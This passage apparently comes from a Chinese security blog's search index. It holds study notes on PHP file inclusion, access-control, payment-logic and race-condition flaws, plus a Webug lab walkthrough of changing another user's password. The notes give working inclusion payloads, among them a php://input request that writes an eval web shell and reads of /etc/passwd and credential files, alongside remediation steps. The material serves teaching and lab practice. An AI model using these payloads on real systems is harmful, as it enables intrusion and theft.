<h3 id="Windows敏感文件"><a href="#Windows敏感文件" class="headerlink" title="Windows敏感文件"></a>Windows敏感文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\boot.ini      //查看系统版本</span><br><span class="line">C:\windows\system32\inetsrv\MetaBase.xml       //iis配置⽂件</span><br><span class="line">C:\windows\repair\same     //存储windows系统初次安装密码</span><br><span class="line">C:\ProgramFiles\mysql\my.ini    //mysql配置信息</span><br><span class="line">C:\ProgramFiles\mysql\data\mysql\user.MYD      //mysql root密码 </span><br><span class="line">C:\windows\php.ini           //php配置信息</span><br></pre></td></tr></table></figure>

<h3 id="Linux敏感文件"><a href="#Linux敏感文件" class="headerlink" title="Linux敏感文件"></a>Linux敏感文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd            //账户信息</span><br><span class="line">/etc/shadow          //账户密码⽂件</span><br><span class="line">/etc/apache2/apache2.conf          //Apache2默认配置⽂件</span><br><span class="line">/etc/apache2/sites-available/000-default.conf        //虚拟⽹站配置</span><br><span class="line">/etc/php/5.6/apache2/php.ini               //php相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf         //apache配置信息</span><br><span class="line">/etc/my.conf          //mysql配置⽂件</span><br></pre></td></tr></table></figure>

<h3 id="包含本地敏感文件"><a href="#包含本地敏感文件" class="headerlink" title="包含本地敏感文件"></a>包含本地敏感文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure>

<h3 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h3><p>只要被包含的文件符合PHP语法，就会将这个文件当成PHP文件解析执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=1.jpg</span><br></pre></td></tr></table></figure>

<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>远程文件包含与本地文件包含的原因是⼀样的</p>
<p>当php.ini 中的配置选项a llow_url_fopen和allow_url_include为ON的话</p>
<p>则包含的文件可以是第三方服务器中的文件，这样就形成了远程文件包含漏洞</p>
<p>需要php配置文件“php.ini”开启allow_url_include = On</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=http://xxx/1.jpg</span><br></pre></td></tr></table></figure>

<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h2><p>Apacha在用户访问网站是记录了用户的访问日志，访问行为等等，这些都可以通过日志来查看相关信息</p>
<h2 id="利用PHP协议"><a href="#利用PHP协议" class="headerlink" title="利用PHP协议"></a>利用PHP协议</h2><p> PHP伪协议事实上就是支持的协议与封装协议，⼀共12种</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:// — 访问本地⽂件系统</span><br><span class="line">http:// — 访问 HTTP(s) ⽹址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输⼊/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的⽂件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — ⾳频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>

<h3 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h3><p>用于访问本地⽂件系统</p>
<p>在双off的情况下也是可以正常使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxxx/?page=file:///etc/passwd</span><br></pre></td></tr></table></figure>

<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>用于读取源码且在配置文件双off的情况下也可以正常使用 </p>
<p>因为直接包含php文件时会被解析了，无法看到源码，所以用 filter 来读取敏感文件，但是需要进行base64 加密</p>
<p>传输（因为php⽂件⾥含有特殊符号，不编码可能读不出来）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxxx/?page=php://filter/read=convert.base64-encode/resource=include.php</span><br></pre></td></tr></table></figure>

<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>主要用来接收 post 数据，将 post 请求中的数据作为 php 代码执行</p>
<p>需要开启allow_url_include</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxxx/?page=php://input</span><br><span class="line">post data：&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\$_POST[&#x27;xxxser&#x27;]);?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure>

<p>php会编译双引号的变量($name)，而刚好用了双引号，若不加反斜杠把$转义⼀下，就会认为$_POST是个变量</p>
<p>PHP单引号及双引号均可以修饰字符串类型的数据</p>
<p>区别是： 双引号会替换变量的值，而单引号会把它当做字符串输出</p>
<h3 id="zip-、bzip2-、zlib"><a href="#zip-、bzip2-、zlib" class="headerlink" title="zip://、bzip2://、zlib://"></a>zip://、bzip2://、zlib://</h3><p>在双off 的情况下也可以正常使用，都属于压缩流，可以访问压缩文件中的子文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip://[压缩⽂件绝对路径]#[压缩⽂件内的⼦⽂件名]</span><br></pre></td></tr></table></figure>

<p>这里的井号需要进行url编码</p>
<p>如果不进行url编码的话井号后面的内容是传不到服务器的， #代表网页中的⼀个位置</p>
<p>其右面的字符，就是该位置的标识符 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxxx/?page=zip://D:\1.jpg%231.txt</span><br></pre></td></tr></table></figure>

<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>类似于zip 协议，但是可以使用相对路径</p>
<p>双off的情况下也可以使用（php版本&gt;= 5.3）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar://[压缩⽂件绝对/相对路径]/[压缩⽂件内的⼦⽂件名]</span><br><span class="line">http://xxxx/?page=phar://1.jpg\1.txt</span><br></pre></td></tr></table></figure>

<h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>将原本的 include 的文件流重定向到了用户可控制的输入流中</p>
<p>必须在双 on 的情况下才能正常使用 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxxx/?page=data://text/plain,%3C?php%20phpinfo();</span><br></pre></td></tr></table></figure>

<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><ol>
<li>尽量不使用动态包含，无需情况下设置 allow_url_include 和 allow_url_fopen 为关闭</li>
<li>对可以包含的文件进⾏限制：使用白名单的方式，或者设置包含的目录，open_basedir</li>
<li>严格检查用户输⼊，参数中不允许出现 ../ 之类的目录跳转符</li>
<li>不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行</li>
</ol>
]]></content>
      <categories>
        <category>web安全</category>
        <category>6.文件包含</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言基础</title>
    <url>/2021/06/17/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>PWN</category>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>越权+支付逻辑+条件竞争</title>
    <url>/2021/06/22/%E8%B6%8A%E6%9D%83-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
    <content><![CDATA[<p>越权漏洞、支付逻辑漏洞，条件竞争漏洞的定义、分类、利用方法及其预防措施</p>
<span id="more"></span>

<h1 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h1><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><p>越权访问（Broken Access Control，简称BAC），指应用在检查授权时存在纰漏，使得攻击者在获得低权限用户</p>
<p>账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。</p>
<h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><p>（1）横向/水平越权访问漏洞(权限相同)：攻击者尝试访问与他拥有相同权限的用户资源</p>
<p>（2）与纵向/垂直越权访问漏洞(权限不同)：由于后台应用没有做权限控制，或仅仅在菜单按钮上做了权限控制，</p>
<p>导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，</p>
<p>达到权限提升的目的</p>
<img src="/2021/06/22/%E8%B6%8A%E6%9D%83-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/1.jpg" style="zoom:67%;">



<h2 id="产生原因："><a href="#产生原因：" class="headerlink" title="产生原因："></a>产生原因：</h2><p>通常情况下，一个 Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果</p>
<p>如果验证权限不足，便会导致越权</p>
<p>常见的程序都会认为通过登录后即可验证用户的身份，从而不会做下一步验证，最后导致越权</p>
<p>开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信二遗漏了权限的判定</p>
<h3 id="通过隐藏-URL"><a href="#通过隐藏-URL" class="headerlink" title="通过隐藏 URL"></a>通过隐藏 URL</h3><p>实现控制访问有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但 </p>
<p>URL 泄露或被恶意攻击者猜到后，这会导致越权攻击</p>
<h3 id="直接对象引用"><a href="#直接对象引用" class="headerlink" title="直接对象引用"></a>直接对象引用</h3><p>通过修改一下参数就可以产生水平越权（eg：查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 </p>
<p>ID 号时会返回他人的信息）</p>
<h3 id="多阶段功能"><a href="#多阶段功能" class="headerlink" title="多阶段功能"></a>多阶段功能</h3><p>多阶段功能是一个功能有多个阶段的实现（eg：修改密码，可能第一步是验证用户身份信息，号码验证码类…）</p>
<p>当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改</p>
<p>参数值，导致可修改任意用户密码</p>
<h3 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h3><p>很多网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当</p>
<p>这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量</p>
<p>下载。</p>
<h3 id="平台配置错误"><a href="#平台配置错误" class="headerlink" title="平台配置错误"></a>平台配置错误</h3><p>一些程序会通过控件来限制用户的访问（eg：后台地址…）普通用户不属于管理员组，则不能访问</p>
<p>但当配置平台或配置控件错误时，就会出现越权访问。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="流程："><a href="#流程：" class="headerlink" title="流程："></a>流程：</h3><p>抓包修改id</p>
<p>明白每个参数的作用，再根据参数来寻找越权</p>
<h3 id="技巧："><a href="#技巧：" class="headerlink" title="技巧："></a>技巧：</h3><p>一个站里面很多包的参数命名可能是通用的，或是变化不大的，可通过寻找包里的身份验证参数进行修改</p>
<h3 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h3><p>Pikachu靶场：Over Permission</p>
<p><a href="http://stupidwolf-woof.com/2021/06/10/Over-Permission/">Over Permission | Cyber security (stupidwolf-woof.com)</a></p>
<p>Webug靶场：越权修改密码</p>
<p><a href="http://stupidwolf-woof.com/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/">越权修改密码 | Cyber security (stupidwolf-woff.com)</a></p>
<h1 id="支付逻辑漏洞"><a href="#支付逻辑漏洞" class="headerlink" title="支付逻辑漏洞"></a>支付逻辑漏洞</h1><h2 id="定义：-1"><a href="#定义：-1" class="headerlink" title="定义："></a>定义：</h2><p>支付历程中存在业务逻辑层的漏洞</p>
<p>支付流程：选择商品和数量-&gt;选择支付及配送方式-&gt;生成订单-&gt;订单支付-&gt;完成支付</p>
<h2 id="产生原因：-1"><a href="#产生原因：-1" class="headerlink" title="产生原因："></a>产生原因：</h2><p>直接在支付的关键步骤数据包中直接传递需要支付的金额</p>
<p>后端未做校验，传递过程中也没做签名，导致可随意篡改金额提交</p>
<h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><h3 id="场景举例："><a href="#场景举例：" class="headerlink" title="场景举例："></a>场景举例：</h3><p>1.修改购买数量</p>
<p>在进行支付订单的时候，可以修改物品的数量来进行操作，可以通过支付一件的价格购买多件，或者修改成负数来</p>
<p>增加金额</p>
<p>2.修改支付价格</p>
<p>抓包修改价格参数的内容，在支付当中，购买商品一般分为三步骤：订购、确认信息、付款，在这三个步骤中都有</p>
<p>可能存在漏洞，金额可以尝试修改小额或者修改负</p>
<p>3.修改支付对应的商品</p>
<p>通过修改商品对应的id号，可以利用低价购买高价商品</p>
<p>4.修改支付的状态</p>
<p>没有对支付状态的值跟实际订单支付状态进行校验，导致点击支付时抓包修改决定支付或未支付发参数为支付状态</p>
<p>的值从而达到成功</p>
<p>5.修改附属优惠、领取优惠</p>
<p>（1）修改优惠券金额</p>
<p>（2）修改积分金额</p>
<p>（3）无限制使用</p>
<p>（4）修改优惠价</p>
<p>比如一些商品有优惠价，优惠多少多少，在支付时抓包，修改这个优惠价就可造成支付问题产生</p>
<p>6.测试数据包未删除</p>
<p>开发在进行测试的时候有一些测试数据未删除，导致用户可以购买测试数据，或者领取测试的优惠券</p>
<p>7.其他类型</p>
<p>（1）修改支付接口：比如一些网站支持很多种支付，比如自家的支付工具，第三方的支付工具，然后每个支付接</p>
<p>值不一样，如果逻辑设计不当，当随便选择一个点击支付时进行抓包，然后修改其支付接口为一个不存在的接口，</p>
<p>如果没做好不存在接口的相关处理，则会支付成功</p>
<p>（2）重复支付：类似试用券，试用完成或者主动取消试用时，试用券会返回到账户当中</p>
<p>（3）最大额支付：在设置的时候，商城的支付金额有上限，当输入9999999999999类似的一个超大数的时候，</p>
<p>可能会存在溢出，或者直接变为0</p>
<p>（4）条件竞争：同时发包获取优惠券等，可以绕过限制的次数（签约漏洞）</p>
<h3 id="举例：-1"><a href="#举例：-1" class="headerlink" title="举例："></a>举例：</h3><p>大米cms支付逻辑漏洞</p>
<h1 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h1><h2 id="定义：-2"><a href="#定义：-2" class="headerlink" title="定义："></a>定义：</h2><p>条件竞争漏洞（Race condition）：发生在多个线程同时访问同一个共享代码、变量、文件等没有进行</p>
<p>锁操作或者同步操作的场景中</p>
<p>存在于操作系统、数据库、web等多个层面，eg：脏牛（dirty cow）</p>
<h2 id="产生原因：-2"><a href="#产生原因：-2" class="headerlink" title="产生原因："></a>产生原因：</h2><p>一个系统运行结果依赖于不可控的事情的先后顺序的时候，就可能发生竞争</p>
<h2 id="举例：-2"><a href="#举例：-2" class="headerlink" title="举例："></a>举例：</h2><p>Hackerone：flag兑换邀请码的案例</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>3.逻辑漏洞</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>越权修改密码</title>
    <url>/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p>越权操作思路+流程</p>
<span id="more"></span>

<h1 id="观察页面"><a href="#观察页面" class="headerlink" title="观察页面"></a>观察页面</h1><p>打开靶场观察</p>
<img src="/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/1.png" alt="1" style="zoom:50%;">

<p>先尝试最常用的：用户名密码均为admin</p>
<p>登陆成功，提示修改密码</p>
<img src="/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/2.png" style="zoom:50%;">

<p>URL：/control/auth_cross/cross_auth_passwd2.php?id=1</p>
<p>查看数据库知他有两个账户</p>
<ul>
<li>admin    admin </li>
<li>aaaaa    asdfsadf</li>
</ul>
<p>登录第二个账户</p>
<p>修改界面与admin相同</p>
<p>URL：control/auth_cross/cross_auth_passwd2.php?id=2</p>
<p>尝试将id改为1后刷新网页</p>
<p>URL变为：/control/auth_cross/cross_auth_passwd2.php?id=1</p>
<p>则此时便可对admin账户进行密码修改操作</p>
<h1 id="抓取数据包"><a href="#抓取数据包" class="headerlink" title="抓取数据包"></a>抓取数据包</h1><p>根据题目，是要越权修改密码</p>
<p>打开Burp，抓取admin修改密码时的数据包</p>
<p>PHPSESSID=7e8a67ea03add4001e3c0723a97321da</p>
<p>再抓取普通用户修改密码时的数据包</p>
<p>send to repeater</p>
<img src="/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/3.png" alt="3" style="zoom:50%;">

<p>发现admin与普通用户的PHPSESSID相同</p>
<p>修改：id=1，旧密码为admin旧密码，再修改新密码</p>
<p>发现修改成功</p>
<p>若随便输入一个旧密码是否起作用</p>
<p>修改：id=1，旧密码111（随便输），新密码456</p>
<p>修改成功</p>
<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>通过将id值，新密码值随便修改，便可达到越权修改密码的目的</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>漏洞靶场练习</category>
        <category>Webug4.0</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>漏洞靶场</tag>
      </tags>
  </entry>
</search>
